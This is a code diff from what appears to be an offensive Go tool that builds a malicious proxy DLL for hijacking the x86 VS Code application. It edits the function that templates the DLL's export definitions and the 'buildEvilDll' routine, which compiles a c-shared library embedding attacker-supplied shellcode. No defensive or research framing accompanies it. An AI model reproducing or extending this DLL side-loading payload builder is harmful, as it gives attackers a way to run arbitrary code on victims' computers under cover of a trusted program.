@@ -13,7 +13,7 @@ import (
 type DllHijackOptionItem struct {
 	Type int `json:"type"`
 	Name string `json:"name"`
-	runner RunnerIface `json:"-"` 
+	Runner RunnerIface `json:"-"` 
 }
 
 func DllHijackConfig() ([]DllHijackOptionItem) {
@@ -21,7 +21,7 @@ func DllHijackConfig() ([]DllHijackOptionItem) {
 		{
 			Type: 1,
 			Name: "(x86) vscode",
-			runner: new(DllHijackVscode),
+			Runner: new(DllHijackVscode),
 		},
 	}
 }
@@ -39,8 +39,8 @@ func (p *DllHijackVscode) SetShellcdoe(shellcode []byte) {
 	p.shellcode = shellcode
 }
 
-func (p *DllHijackVscode) updateDefFile(defFilePath string, exports []string) (err error) {
-	t, err := template.New("test").ParseFiles(defFilePath)
+func (p *DllHijackVscode) updateDefFile(defFilePath string, exports []string, dllName string) (err error) {
+	t, err := template.ParseFiles(defFilePath)
 	if err != nil {
 		return err
 	}
@@ -49,7 +49,11 @@ func (p *DllHijackVscode) updateDefFile(defFilePath string, exports []string) (e
 		return err
 	}
 	defer f.Close()
-	err = t.Execute(f, exports)
+	data := map[string]interface{} {
+		"DllName": dllName,
+		"Exports": exports,
+	}
+	err = t.Execute(f, data)
 	return
 }
 
@@ -87,7 +91,7 @@ func (p *DllHijackVscode) buildEvilDll(workDir string, x64 bool, expPath string)
 	}
 	// 生成dll
 	outputDll := filepath.Join(workDir, "output.dll")
-	ldflags := fmt.Sprintf("-s -w -extldflags=-Wl,%s", expPath)
+	ldflags := fmt.Sprintf("-extldflags=-Wl,%s -s -w", expPath)
 	cmd = exec.Command("go", "build", "-trimpath", "-o", outputDll, "-buildmode", "c-shared", "-ldflags", ldflags)
 	cmd.Stdout = os.Stdout
 	cmd.Stderr = os.Stderr
@@ -106,7 +110,7 @@ func (p *DllHijackVscode) Run() ([]byte, error) {
 	if err != nil {
 		return nil, err
 	}
-	defer os.RemoveAll(tmpDir)
+	// defer os.RemoveAll(tmpDir)
 	// 更新def文件
 	defPath := filepath.Join(tmpDir, "functions.def")
 	err = p.updateDefFile(defPath, p.getExports())
